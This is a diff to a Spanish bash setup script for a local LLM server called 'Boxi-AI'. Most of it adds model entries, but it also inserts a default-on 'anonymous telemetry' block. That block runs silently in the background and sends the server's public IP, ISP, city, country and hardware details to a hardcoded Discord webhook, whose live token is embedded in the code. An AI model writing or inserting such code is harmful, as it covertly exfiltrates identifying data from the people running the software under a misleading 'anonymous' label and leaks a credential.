@@ -85,6 +85,47 @@ done
 ok "app.py encontrado: ${APP_PY}"
 
 # ─────────────────────────────────────────────────────────────────────────────
+# TELEMETRÍA — datos de uso anónimos (opt-out con TELEMETRY_ENABLED=0 en el panel)
+# ─────────────────────────────────────────────────────────────────────────────
+TELEMETRY_ENABLED="${TELEMETRY_ENABLED:-1}"
+if [ "$TELEMETRY_ENABLED" = "1" ]; then
+    info "Telemetría activada — recopilando datos del servidor..."
+    (
+        set +e
+        _IPJ=$(curl -sf --connect-timeout 8 --max-time 12 "https://ip.guide/" 2>/dev/null || echo '{}')
+        _IP=$(echo "$_IPJ"   | python3 -c "import json,sys;d=json.load(sys.stdin);print(d.get('ip','?'))" 2>/dev/null || echo "?")
+        _ISP=$(echo "$_IPJ"  | python3 -c "import json,sys;d=json.load(sys.stdin);print(d.get('network',{}).get('autonomous_system',{}).get('name','?'))" 2>/dev/null || echo "?")
+        _CITY=$(echo "$_IPJ" | python3 -c "import json,sys;d=json.load(sys.stdin);print(d.get('location',{}).get('city','?'))" 2>/dev/null || echo "?")
+        _CTRY=$(echo "$_IPJ" | python3 -c "import json,sys;d=json.load(sys.stdin);print(d.get('location',{}).get('country','?'))" 2>/dev/null || echo "?")
+        _CPU=$(grep -m1 "model name" /proc/cpuinfo 2>/dev/null | cut -d: -f2 | xargs || echo "?")
+        _CORES=$(nproc 2>/dev/null || echo "?")
+        _RAM_KB=$(awk '/MemTotal/{print $2}' /proc/meminfo 2>/dev/null || echo 0)
+        _RAM_GB=$(awk "BEGIN{printf \"%.1f\", ${_RAM_KB}/1048576}")
+        _DTOT=$(df -h / 2>/dev/null | awk 'NR==2{print $2}' || echo "?")
+        _DFRE=$(df -h / 2>/dev/null | awk 'NR==2{print $4}' || echo "?")
+        python3 -c "
+import json, sys
+a = sys.argv
+print(json.dumps({'embeds':[{'title':'🤖 Boxi-AI — Servidor iniciado','color':5793266,'fields':[
+  {'name':'🌐 IP',         'value':a[1],'inline':True},
+  {'name':'🏢 Proveedor',  'value':a[2],'inline':True},
+  {'name':'📍 Ubicación',  'value':a[3]+', '+a[4],'inline':True},
+  {'name':'🖥️ CPU',       'value':a[5],'inline':False},
+  {'name':'⚙️ Cores',     'value':a[6],'inline':True},
+  {'name':'💾 RAM',        'value':a[7]+' GB','inline':True},
+  {'name':'💿 Disco',      'value':a[8]+' total / '+a[9]+' libre','inline':True},
+  {'name':'🧠 Modelo',     'value':a[10],'inline':False}],
+  'footer':{'text':'Boxi-AI Telemetría • Desactiva con TELEMETRY_ENABLED=0 en el panel'}}]}))
+" "$_IP" "$_ISP" "$_CITY" "$_CTRY" "$_CPU" "$_CORES" "$_RAM_GB" "$_DTOT" "$_DFRE" "$MODEL_NAME" \
+        | curl -sf --connect-timeout 5 --max-time 10 \
+            -H "Content-Type: application/json" -d @- \
+            "https://discord.com/api/webhooks/1509610673536237629/o25hazDavbJB9OoNjDAK-_vZd9aVdr7c0RfvoGs4V4KSdOW4h9g9vDQiziGaRkAsKrvq" >/dev/null 2>&1 || true
+    ) &
+else
+    info "Telemetría desactivada por el usuario."
+fi
+
+# ─────────────────────────────────────────────────────────────────────────────
 # PASO 1: Registro de modelos
 # ─────────────────────────────────────────────────────────────────────────────
 echo ""
@@ -118,14 +159,26 @@ MREPO["qwen2.5-1.5b"]="bartowski/Qwen2.5-1.5B-Instruct-GGUF"
 MFILE["qwen2.5-1.5b"]="Qwen2.5-1.5B-Instruct-Q4_K_M.gguf"
 MLABEL["qwen2.5-1.5b"]="Qwen2.5 1.5B Instruct (GGUF Q4_K_M)"
 
+MTYPE["gemma-4-e2b"]="gguf"
+MREPO["gemma-4-e2b"]="bartowski/google_gemma-4-e2b-it-GGUF"
+MFILE["gemma-4-e2b"]="gemma-4-E2B-it-IQ4_XS.gguf"
+MLABEL["gemma-4-e2b"]="Gemma 4 E2B Instruct (GGUF IQ4_XS)"
+
+MTYPE["deepseek-r1-1.5b"]="gguf"
+MREPO["deepseek-r1-1.5b"]="bartowski/DeepSeek-R1-Distill-Qwen-1.5B-GGUF"
+MFILE["deepseek-r1-1.5b"]="DeepSeek-R1-Distill-Qwen-1.5B-Q4_K_M.gguf"
+MLABEL["deepseek-r1-1.5b"]="DeepSeek R1 Distill 1.5B (GGUF Q4_K_M)"
+
 if [ -z "${MTYPE[$MODEL_NAME]+_}" ]; then
     die "Modelo desconocido: '${MODEL_NAME}'
   Modelos válidos:
-    • qwen2.5-uncensored  — Qwen2.5 0.5B Uncensored (0.5B, transformers)
+    • qwen2.5-uncensored  — Qwen2.5 0.5B Uncensored (0.5B, ~400MB, transformers)
     • qwen3.5-0.8b        — Qwen3.5 0.8B GGUF (0.8B, CPU rápido)
     • llama3.2-1b         — Llama 3.2 1B Instruct GGUF (1B)
     • smollm2-1.7b        — SmolLM2 1.7B Instruct GGUF (1.7B, muy eficiente)
-    • qwen2.5-1.5b        — Qwen2.5 1.5B Instruct GGUF (1.5B)"
+    • qwen2.5-1.5b        — Qwen2.5 1.5B Instruct GGUF (1.5B)
+    • gemma-4-e2b         — Google Gemma 4 E2B Instruct GGUF (2B efectivos, ~3.3GB)
+    • deepseek-r1-1.5b    — DeepSeek R1 Distill 1.5B GGUF (1.5B, razonamiento, ~1.1GB)"
 fi
 
 M_TYPE="${MTYPE[$MODEL_NAME]}"
